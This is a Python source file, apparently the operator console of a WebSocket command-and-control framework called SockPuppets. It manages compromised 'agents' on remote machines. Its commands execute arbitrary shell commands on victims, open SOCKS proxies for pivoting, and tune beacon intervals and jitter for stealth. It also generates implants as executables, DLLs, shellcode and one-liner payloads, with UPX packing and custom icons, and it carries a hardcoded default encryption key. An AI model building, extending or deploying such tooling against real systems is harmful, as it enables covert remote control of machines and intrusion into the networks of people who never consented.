#!/usr/bin/env python3
"""
SockPuppets - WebSocket Framework
Main CLI Interface
"""

import asyncio
import cmd
import sys
import os
import time
from pathlib import Path
from agent import AgentGenerator
from server import get_server_instance, start_server
import threading


ASCII_ART = r"""
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
|   __|     |     |  |  |  _  |  |  |  _  |  _  |   __|_   _|   __|
|__   |  |  |   --|    -|   __|  |  |   __|   __|   __|  |  |__   |
|_____|_____|_____|__|__|__|  |_____|__|  |__|  |_____|  |  |_____|

                    by AJ Hammond @ajm4n
		        x.com/4JMAN
"""


class SockPuppetsCLI(cmd.Cmd):
    """Interactive CLI for SockPuppets"""

    intro = ASCII_ART + "\nType 'help' for available commands.\n"
    prompt = "\033[1;36msockpuppets>\033[0m "

    def __init__(self):
        super().__init__()
        self.server = None
        self.server_running = False
        self.current_agent = None
        self.loop = None
        self.encryption_key = 'SOCKPUPPETS_KEY_2026'

    def do_start(self, arg):
        """Start the server: start [host] [port] [--key=<key>] [--ssl]"""
        if self.server_running:
            print("[-] Server is already running")
            return

        args = arg.split()
        host = '0.0.0.0'
        port = 8443
        key = self.encryption_key
        use_ssl = False

        positional_idx = 0
        for arg in args:
            if arg.startswith('--key='):
                key = arg.split('=', 1)[1]
                self.encryption_key = key
            elif arg == '--ssl':
                use_ssl = True
            elif not arg.startswith('--'):
                if positional_idx == 0:
                    host = arg
                elif positional_idx == 1:
                    try:
                        port = int(arg)
                    except ValueError:
                        print("[-] Invalid port number")
                        return
                positional_idx += 1

        protocol = "wss" if use_ssl else "ws"
        print(f"[*] Starting server on {protocol}://{host}:{port}...")

        def run_server():
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(start_server(host, port, key, use_ssl))

        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()

        import time
        time.sleep(1)

        self.server = get_server_instance()
        self.server_running = True
        print(f"[+] Server started on {protocol}://{host}:{port}")
        print(f"[+] HTA polling endpoint on http://{host}:{port + 1}/hta")
        if use_ssl:
            print(f"[+] TLS enabled (WSS mode)")
        if key != 'SOCKPUPPETS_KEY_2026':
            print(f"[+] Using custom encryption key")

    def do_stop(self, arg):
        """Stop the server"""
        if not self.server_running:
            print("[-] Server is not running")
            return

        print("[*] Stopping server...")

        # Close all active WebSocket connections
        if self.server:
            for agent in self.server.agents.values():
                if agent.websocket and agent.websocket in self.server.active_connections:
                    try:
                        asyncio.run_coroutine_threadsafe(
                            agent.websocket.close(), self.loop
                        ).result(timeout=2)
                    except Exception:
                        pass
            self.server.active_connections.clear()
            self.server.agents.clear()

            # Close the WebSocket server
            if hasattr(self.server, 'ws_server') and self.server.ws_server:
                self.server.ws_server.close()

        # Stop the event loop
        if self.loop and self.loop.is_running():
            self.loop.call_soon_threadsafe(self.loop.stop)

        self.server_running = False
        self.server = None
        self.loop = None
        print("[+] Server stopped")

    def _format_agent_list(self, agents, title, active_ids):
        """Shared helper for formatting agent lists"""
        print(f"\n\033[1m{title}:\033[0m")
        print("=" * 80)
        for agent in agents:
            status = "\033[92m●\033[0m" if agent['id'] in active_ids else "\033[91m●\033[0m"
            mode = agent['mode']
            mode_badge = "\033[93m[BEACON]\033[0m" if mode == 'beacon' else "\033[92m[STREAM]\033[0m"

            print(f"{status} \033[1m{agent['id']}\033[0m {mode_badge}")
            print(f"   Hostname:   {agent['hostname']}")
            print(f"   Username:   {agent['username']}")
            print(f"   OS:         {agent['os']}")
            print(f"   IP:         {agent['ip']}")
            print(f"   Connected:  {agent['connected_at']}")
            print(f"   Last Seen:  {agent['last_seen']}")
            if mode == 'beacon':
                jitter_str = f" ±{agent.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent else ""
                print(f"   Beacon:     {agent['beacon_interval']}s{jitter_str} interval")
                health_warning = self.server.check_agent_health(agent['id'])
                if health_warning:
                    print(f"   \033[1;31m⚠ WARNING: {health_warning}\033[0m")
            print()

    def do_agents(self, arg):
        """List all agents"""
        if not self.server_running:
            print("[-] Server is not running. Start it first with 'start'")
            return

        agents = self.server.get_agent_list()
        if not agents:
            print("[-] No agents connected")
            return

        active_ids = {a['id'] for a in self.server.get_active_agents()}
        self._format_agent_list(agents, "Connected Agents", active_ids)

    def do_puppets(self, arg):
        """List all agents (alias for 'agents')"""
        return self.do_agents(arg)

    def do_beacons(self, arg):
        """List only beacon mode agents"""
        if not self.server_running:
            print("[-] Server is not running. Start it first with 'start'")
            return

        agents = [a for a in self.server.get_agent_list() if a['mode'] == 'beacon']
        if not agents:
            print("[-] No beacon agents connected")
            return

        active_ids = {a['id'] for a in self.server.get_active_agents()}
        self._format_agent_list(agents, "Beacon Agents", active_ids)

    def do_streamers(self, arg):
        """List only streaming mode agents"""
        if not self.server_running:
            print("[-] Server is not running. Start it first with 'start'")
            return

        agents = [a for a in self.server.get_agent_list() if a['mode'] == 'streaming']
        if not agents:
            print("[-] No streaming agents connected")
            return

        active_ids = {a['id'] for a in self.server.get_active_agents()}
        self._format_agent_list(agents, "Streaming Agents", active_ids)

    def do_remove(self, arg):
        """Remove a dead agent from tracking: remove <agent_id>"""
        if not self.server_running:
            print("[-] Server is not running")
            return

        if not arg:
            print("[-] Usage: remove <agent_id>")
            return

        agent_id = arg.strip()
        if agent_id not in self.server.agents:
            print(f"[-] Agent {agent_id} not found")
            return

        agent = self.server.agents[agent_id]
        if agent.websocket in self.server.active_connections:
            self.server.active_connections.discard(agent.websocket)
        del self.server.agents[agent_id]
        print(f"[+] Agent {agent_id} removed from tracking")

    def do_interact(self, arg):
        """Interact with an agent: interact <agent_id>"""
        if not self.server_running:
            print("[-] Server is not running")
            return

        if not arg:
            print("[-] Usage: interact <agent_id>")
            return

        agent_id = arg.strip()
        agents = {a['id']: a for a in self.server.get_agent_list()}

        if agent_id not in agents:
            print(f"[-] Agent {agent_id} not found")
            return

        self.current_agent = agent_id
        agent_info = agents[agent_id]
        mode = agent_info['mode']

        # Check if beacon might be dead
        if mode == 'beacon':
            death_status = self.server.check_agent_health(agent_id)
            if death_status:
                print(f"\033[1;31m[!] WARNING: {death_status}\033[0m")

        print(f"[+] Interacting with agent {agent_id} ({agent_info['hostname']})")
        print(f"[*] Mode: {mode.upper()}")
        if mode == 'beacon':
            jitter_str = f" ±{agent_info.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent_info else ""
            print(f"[*] Beacon interval: {agent_info['beacon_interval']}s{jitter_str}")
            active_agents = {a['id']: a for a in self.server.get_active_agents()}
            if agent_id not in active_agents:
                print(f"[*] Status: Disconnected (waiting for checkin)")
        print("[*] Type 'back' or 'exit' to return to main menu")
        print("[*] Type 'kill' to terminate the agent")
        print("[*] Type 'results' to view pending results")
        print("[*] Type 'socks <port>' to start SOCKS proxy")
        print("[*] Type 'sleep <seconds>' to set beacon interval")
        print("[*] Type 'upgrade' to switch to streaming mode")
        print("[*] Type 'downgrade [seconds]' to switch to beacon mode")

        # Track last seen results for auto-display (beacon mode only)
        last_result_count = 0
        result_check_thread = None
        stop_checking = threading.Event()

        def check_results():
            """Background thread to check for new results"""
            nonlocal last_result_count
            while not stop_checking.is_set() and self.current_agent:
                try:
                    # Only check results in beacon mode
                    current_agent = self.server.agents.get(agent_id)
                    if current_agent and current_agent.mode == 'beacon':
                        current_results = self.server.get_agent_results(agent_id, clear=False)
                        if len(current_results) > last_result_count:
                            # New results arrived
                            new_results = current_results[last_result_count:]
                            for res in new_results:
                                cmd_text = res.get('command', 'Unknown')
                                output = res.get('output', '')
                                print(f"\n\033[1;32m[+] Result for: {cmd_text}\033[0m")
                                print(output)
                                print(f"\033[1;33magent[{agent_id}]>\033[0m ", end='', flush=True)
                            last_result_count = len(current_results)
                            # Clear results after displaying
                            self.server.get_agent_results(agent_id, clear=True)
                            last_result_count = 0
                except Exception:
                    pass
                time.sleep(1)  # Check every second

        # Start result checking thread (works for both modes, auto-detects)
        result_check_thread = threading.Thread(target=check_results, daemon=True)
        result_check_thread.start()

        try:
            while self.current_agent:
                try:
                    command = input(f"\033[1;33magent[{agent_id}]>\033[0m ").strip()

                    if command.lower() in ['back', 'exit']:
                        self.current_agent = None
                        print("[*] Returning to main menu")
                        break

                    if command.lower() == 'kill':
                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        try:
                            # Check current mode
                            current_agent = self.server.agents.get(agent_id)
                            if current_agent and current_agent.mode == 'beacon':
                                print(f"[*] Waiting for beacon to check in...")
                                timeout = 65
                            else:
                                timeout = 5

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.kill_agent(agent_id),
                                self.loop
                            )
                            result = future.result(timeout=timeout)
                            print(f"[+] {result}")

                            # Exit agent interaction after kill
                            if "killed" in result.lower():
                                self.current_agent = None
                                print("[*] Returning to main menu")
                                break
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower() == 'results':
                        # Show pending results from beacon
                        results = self.server.get_agent_results(agent_id, clear=False)
                        if not results:
                            print("[*] No pending results")
                        else:
                            print(f"\n[+] Pending Results ({len(results)}):")
                            print("=" * 80)
                            for i, res in enumerate(results, 1):
                                cmd = res.get('command', 'Unknown')
                                output = res.get('output', '')
                                received = res.get('received_at', '')
                                print(f"\n[{i}] Command: {cmd}")
                                print(f"    Received: {received}")
                                print(f"    Output:\n{output}")
                                print("-" * 80)

                            # Ask if they want to clear
                            try:
                                clear_choice = input("\nClear these results? [y/N]: ").strip().lower()
                                if clear_choice == 'y':
                                    self.server.get_agent_results(agent_id, clear=True)
                                    print("[+] Results cleared")
                            except:
                                pass
                        continue

                    if command.lower().startswith('socks'):
                        parts = command.split()
                        if len(parts) != 2:
                            print("[-] Usage: socks <port>")
                            continue

                        try:
                            socks_port = int(parts[1])
                            if not self.loop:
                                print("[-] Event loop not available")
                                continue

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.start_socks_proxy(agent_id, socks_port),
                                self.loop
                            )
                            result = future.result(timeout=5)
                            print(f"[+] {result}")
                        except ValueError:
                            print("[-] Invalid port number")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower().startswith('sleep'):
                        parts = command.split()
                        if len(parts) != 2:
                            print("[-] Usage: sleep <seconds>")
                            continue

                        try:
                            interval = int(parts[1])
                            if not self.loop:
                                print("[-] Event loop not available")
                                continue

                            # Check current mode
                            current_agent = self.server.agents.get(agent_id)
                            if current_agent and current_agent.mode == 'beacon':
                                print(f"[*] Waiting for beacon to check in...")
                                timeout = 65  # Wait up to 65 seconds for beacon
                            else:
                                timeout = 5

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.set_beacon_interval(agent_id, interval),
                                self.loop
                            )
                            result = future.result(timeout=timeout)
                            print(f"[+] {result}")
                        except ValueError:
                            print("[-] Invalid interval")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower() == 'upgrade':
                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        try:
                            # Check current mode
                            current_agent = self.server.agents.get(agent_id)
                            if current_agent and current_agent.mode == 'beacon':
                                print(f"[*] Waiting for beacon to check in (interval: {current_agent.beacon_interval}s)...")
                                timeout = 65  # Wait up to 65 seconds for beacon
                            else:
                                timeout = 5

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.upgrade_to_streaming(agent_id),
                                self.loop
                            )
                            result = future.result(timeout=timeout)
                            print(f"[+] {result}")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower().startswith('downgrade'):
                        parts = command.split()
                        interval = 60
                        if len(parts) == 2:
                            try:
                                interval = int(parts[1])
                            except ValueError:
                                print("[-] Invalid interval")
                                continue

                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        try:
                            future = asyncio.run_coroutine_threadsafe(
                                self.server.downgrade_to_beacon(agent_id, interval),
                                self.loop
                            )
                            result = future.result(timeout=5)
                            print(f"[+] {result}")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if not command:
                        continue

                    if not self.loop:
                        print("[-] Event loop not available")
                        break

                    future = asyncio.run_coroutine_threadsafe(
                        self.server.send_command_to_agent(agent_id, command),
                        self.loop
                    )

                    # Check current mode
                    current_agent = self.server.agents.get(agent_id)
                    if current_agent and current_agent.mode == 'streaming':
                        # Streaming mode - wait for immediate response
                        print("[*] Executing command...")
                        result = future.result(timeout=35)
                        print(result)
                    else:
                        # Beacon mode - just queue
                        result = future.result(timeout=5)
                        print(result)

                except KeyboardInterrupt:
                    print("\n[*] Use 'back' to return to main menu")
                except Exception as e:
                    print(f"[-] Error: {str(e)}")
        finally:
            # Stop result checking thread
            stop_checking.set()
            if result_check_thread:
                result_check_thread.join(timeout=2)

    def do_generate(self, arg):
        """Generate agents: generate <host> <port> [options]"""
        args = arg.split()

        if len(args) < 2:
            print("[-] Usage: generate <host> <port> [options]")
            print("    Options:")
            print("      --beacon               Enable beacon mode")
            print("      --interval=N           Beacon interval in seconds")
            print("      --jitter=N             Beacon jitter percentage (0-100)")
            print("      --compile              Compile Python agent to executable")
            print("      --dll                  Compile Python agent to DLL (Windows)")
            print("      --shellcode            Generate shellcode from agent")
            print("      --format=FMT           Shellcode format (raw, c, python, powershell)")
            print("      --os=OS                Target OS (auto, windows, linux, macos)")
            print("      --multi-os             Generate agents for all OS types")
            print("      --arch=ARCH            Target architecture (x86, x64, arm64)")
            print("      --multi-arch           Compile for all architectures")
            print("      --no-upx               Disable UPX compression")
            print("      --icon=PATH            Icon file for executable")
            print("      --key=KEY              Encryption key")
            print("      --oneliners=URL        Generate one-liner payloads")
            return

        host = None
        port = None
        key = self.encryption_key
        compile_exe = False
        compile_dll = False
        gen_shellcode = False
        shellcode_format = 'raw'
        beacon_mode = False
        beacon_interval = 60
        beacon_jitter = 0
        architectures = ['x64']
        use_upx = True
        icon = None
        target_os = 'auto'
        multi_os = False
        oneliners_url = None

        i = 0
        while i < len(args):
            arg = args[i]

            # Helper to get next value (supports both --flag=value and --flag value)
            def get_value(flag_name):
                nonlocal i
                if '=' in arg:
                    return arg.split('=', 1)[1]
                elif i + 1 < len(args):
                    i += 1
                    return args[i]
                else:
                    print(f"[-] {flag_name} requires a value")
                    return None

            if arg.startswith('--key'):
                val = get_value('--key')
                if val is None:
                    return
                key = val
            elif arg.startswith('--interval'):
                val = get_value('--interval')
                if val is None:
                    return
                try:
                    beacon_interval = int(val)
                except ValueError:
                    print("[-] Invalid interval value")
                    return
            elif arg.startswith('--jitter'):
                val = get_value('--jitter')
                if val is None:
                    return
                try:
                    beacon_jitter = int(val)
                    if beacon_jitter < 0 or beacon_jitter > 100:
                        print("[-] Jitter must be between 0 and 100")
                        return
                except ValueError:
                    print("[-] Invalid jitter value")
                    return
            elif arg.startswith('--arch'):
                val = get_value('--arch')
                if val is None:
                    return
                if val in ['x86', 'x64', 'arm64']:
                    architectures = [val]
                else:
                    print(f"[-] Invalid architecture: {val}")
                    return
            elif arg.startswith('--icon'):
                val = get_value('--icon')
                if val is None:
                    return
                icon = val
                if not os.path.exists(icon):
                    print(f"[-] Icon file not found: {icon}")
                    return
            elif arg.startswith('--format'):
                val = get_value('--format')
                if val is None:
                    return
                if val in ['raw', 'c', 'python', 'powershell']:
                    shellcode_format = val
                else:
                    print(f"[-] Invalid shellcode format: {val}")
                    return
            elif arg.startswith('--os'):
                val = get_value('--os')
                if val is None:
                    return
                if val in ['auto', 'windows', 'linux', 'macos']:
                    target_os = val
                else:
                    print(f"[-] Invalid OS: {val}")
                    return
            elif arg.startswith('--oneliners'):
                val = get_value('--oneliners')
                if val is None:
                    return
                oneliners_url = val
            elif arg == '--compile':
                compile_exe = True
            elif arg == '--dll':
                compile_dll = True
            elif arg == '--shellcode':
                gen_shellcode = True
            elif arg == '--beacon':
                beacon_mode = True
            elif arg == '--multi-arch':
                architectures = ['x86', 'x64', 'arm64']
                compile_exe = True
            elif arg == '--multi-os':
                multi_os = True
            elif arg == '--no-upx':
                use_upx = False
            elif host is None:
                host = arg
            elif port is None:
                try:
                    port = int(arg)
                except ValueError:
                    print("[-] Invalid port number")
                    return

            i += 1

        if not host or port is None:
            print("[-] Usage: generate <host> <port> [options]")
            return

        print(f"[*] Generating agents for {host}:{port}...")
        if key != 'SOCKPUPPETS_KEY_2026':
            print(f"[*] Using custom encryption key")
        if beacon_mode:
            jitter_text = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
            print(f"[*] Beacon mode enabled ({beacon_interval}s{jitter_text} interval)")
        if target_os != 'auto':
            print(f"[*] Target OS: {target_os}")
        if multi_os:
            print(f"[*] Multi-OS generation enabled")
        if compile_exe:
            print(f"[*] Compilation enabled for: {', '.join(architectures)}")
            if use_upx:
                print(f"[*] UPX compression enabled")
            if icon:
                print(f"[*] Using icon: {icon}")
        if compile_dll:
            print(f"[*] DLL compilation enabled")
        if gen_shellcode:
            print(f"[*] Shellcode generation enabled ({shellcode_format} format)")

        generator = AgentGenerator()
        results = generator.generate_all(
            c2_host=host, c2_port=port, encryption_key=key,
            beacon_mode=beacon_mode, beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
            compile_exe=compile_exe, compile_dll=compile_dll, generate_shellcode=gen_shellcode,
            shellcode_format=shellcode_format, architectures=architectures, upx=use_upx, icon=icon,
            target_os=target_os, generate_multi_os=multi_os
        )

        print("\n[+] Agent generation complete!")
        print("=" * 60)
        for agent_type, path in results.items():
            print(f"  {agent_type.upper()}: {path}")

        # Generate one-liners if requested
        if oneliners_url:
            print("\n[*] Generating one-liner payloads...")
            oneliners = generator.generate_oneliners(oneliners_url, 'oneliners.txt')
            print(f"[+] Generated {len(oneliners)} one-liner variants")
            for name in oneliners.keys():
                print(f"    - {name}")

    def do_debug(self, arg):
        """Toggle debug mode: debug [on|off]"""
        import logging

        if not arg:
            # Show current status
            current_level = logging.getLogger().level
            status = "ON" if current_level == logging.DEBUG else "OFF"
            print(f"[*] Debug mode is currently: {status}")
            print("[*] Usage: debug [on|off]")
            return

        arg = arg.strip().lower()
        if arg == 'on':
            logging.getLogger().setLevel(logging.DEBUG)
            logging.getLogger('websockets').setLevel(logging.INFO)  # Still suppress websockets noise
            print("[+] Debug mode enabled")
        elif arg == 'off':
            logging.getLogger().setLevel(logging.INFO)
            logging.getLogger('websockets').setLevel(logging.WARNING)
            print("[+] Debug mode disabled")
        else:
            print("[-] Invalid argument. Use: debug [on|off]")

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('clear' if os.name != 'nt' else 'cls')
        print(ASCII_ART)

    def do_exit(self, arg):
        """Exit the program"""
        if self.server_running:
            self.do_stop('')

        print("[*] Goodbye!")
        sys.exit(0)

    def do_quit(self, arg):
        """Exit the program"""
        return self.do_exit(arg)

    def do_help(self, arg):
        """Show help menu"""
        if arg:
            super().do_help(arg)
            return

        print("\n\033[1mAvailable Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mstart [host] [port] [--key=K] [--ssl]\033[0m - Start the server")
        print("  \033[1mstop\033[0m                                 - Stop the server")
        print("  \033[1magents / puppets\033[0m                     - List all connected agents")
        print("  \033[1mbeacons\033[0m                              - List only beacon agents")
        print("  \033[1mstreamers\033[0m                            - List only streaming agents")
        print("  \033[1minteract <agent_id>\033[0m                  - Interact with an agent")
        print("  \033[1mremove <agent_id>\033[0m                    - Remove dead agent from tracking")
        print("  \033[1mgenerate <host> <port> [opts]\033[0m       - Generate agent payloads")
        print("  \033[1mdebug [on|off]\033[0m                       - Toggle debug logging")
        print("  \033[1mclear\033[0m                                - Clear the screen")
        print("  \033[1mexit/quit\033[0m                            - Exit the program")
        print()
        print("\033[1mGenerate Options:\033[0m")
        print("=" * 70)
        print("  \033[1m--beacon\033[0m              Enable beacon mode (stealth)")
        print("  \033[1m--interval=N\033[0m          Beacon check-in interval in seconds")
        print("  \033[1m--jitter=N\033[0m            Beacon jitter percentage (0-100)")
        print("  \033[1m--compile\033[0m             Compile Python agent to executable")
        print("  \033[1m--dll\033[0m                 Compile Python agent to DLL (Windows)")
        print("  \033[1m--shellcode\033[0m           Generate shellcode from agent")
        print("  \033[1m--format=FMT\033[0m          Shellcode format (raw, c, python, powershell)")
        print("  \033[1m--os=OS\033[0m               Target OS (auto, windows, linux, macos)")
        print("  \033[1m--multi-os\033[0m            Generate agents for all OS types")
        print("  \033[1m--arch=ARCH\033[0m           Target architecture (x86, x64, arm64)")
        print("  \033[1m--multi-arch\033[0m          Compile for all architectures")
        print("  \033[1m--no-upx\033[0m              Disable UPX compression")
        print("  \033[1m--icon=PATH\033[0m           Custom icon for executable")
        print("  \033[1m--key=KEY\033[0m             Custom encryption key")
        print("  \033[1m--oneliners=URL\033[0m       Generate one-liner payloads")
        print()
        print("\033[1mAgent Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mback\033[0m                  Return to main menu")
        print("  \033[1mresults\033[0m               View pending beacon results")
        print("  \033[1msocks <port>\033[0m          Start SOCKS5 proxy on port")
        print("  \033[1msleep <seconds>\033[0m       Set beacon interval")
        print("  \033[1mupgrade\033[0m               Upgrade to streaming mode")
        print("  \033[1mdowngrade [seconds]\033[0m   Downgrade to beacon mode")
        print("  \033[1m<any command>\033[0m         Execute command on agent")
        print()


def main():
    """Main entry point"""
    try:
        cli = SockPuppetsCLI()
        cli.cmdloop()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        sys.exit(0)


if __name__ == '__main__':
    main()
